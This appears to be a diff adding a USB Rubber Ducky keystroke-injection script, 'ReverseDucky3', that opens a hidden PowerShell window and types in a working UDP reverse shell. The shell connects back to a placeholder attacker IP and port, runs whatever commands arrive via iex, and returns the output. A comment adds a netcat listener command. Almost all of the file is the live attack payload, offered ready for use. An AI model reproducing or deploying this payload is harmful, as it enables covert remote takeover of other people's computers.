@@ -1,0 +1,29 @@
+REM       ReverseDucky3
+REM       Version 1.0
+REM       OS: Windows / Linux(?) (Not tested with Powershell on Linux)
+REM       Author: 0iphor13
+
+REM       UDP Reverse shell executed in the background. Might create a firewall pop up, but will execute anyway.
+REM       Fill in Attacker-IP and Port in Line 18
+REM       DON'T FORGET TO START LISTENER: nc -ul -p PORT
+
+DELAY 1500
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W hidden
+DELAY 250
+ENTER
+
+DELAY 200
+STRING $E=New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse("0.0.0.0"),PORT);$C=New-Object System.Net.So
+DELAY 100
+STRING ckets.UDPClient(53);[byte[]]$B=0..65535|%{0};$SB=([text.encoding]::ASCII).GetBytes('ReverseDuckyIII:');$C.Send($SB,$S
+DELAY 100
+STRING B.Length,$E);while($true){;$R=$C.Receive([ref]$E);$RD=([text.encoding]::ASCII).GetString($R);$s=(iex $RD 2>&1 | Out-S
+DELAY 100
+STRING tring );$s2=$s+'PS ' + (pwd).Path + '> ';$SB =([text.encoding]::ASCII).GetBytes($s2);$C.Send($SB,$SB.Len
+DELAY 100
+STRING gth,$E)};$C.Close()
+ENTER
+
+
